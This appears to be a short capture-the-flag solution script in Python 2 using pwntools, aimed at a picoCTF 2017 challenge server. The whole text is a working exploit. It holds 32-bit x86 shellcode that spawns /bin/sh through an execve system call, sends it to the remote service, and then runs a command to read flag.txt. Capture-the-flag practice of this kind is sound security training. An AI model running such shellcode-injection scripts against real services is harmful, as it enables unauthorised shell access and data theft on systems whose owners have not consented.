from pwn import *
shellcode = '\x31\xD2\x52\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\x52\x53\x89\xE1\xB8\x0B\x00\x00\x00\xCD\x80'


conn = remote('shell2017.picoctf.com', 49381)
print conn.recv()
conn.sendline(shellcode)
conn.sendline('/bin/cat flag.txt')
conn.sendline('exit')
print conn.recvall()
